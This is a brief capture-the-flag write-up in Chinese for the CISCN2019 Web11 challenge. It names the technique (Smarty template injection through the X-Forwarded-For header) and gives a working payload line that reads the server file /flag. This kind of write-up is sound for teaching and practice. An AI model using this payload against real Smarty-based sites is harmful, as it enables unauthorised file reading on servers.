# [CISCN2019 华东南赛区]

## Web11

控制XFF头
Smarty 注入

payload:

```
X-Forwarded-For: {if print_r(file_get_contents("/flag"))}{/if}
```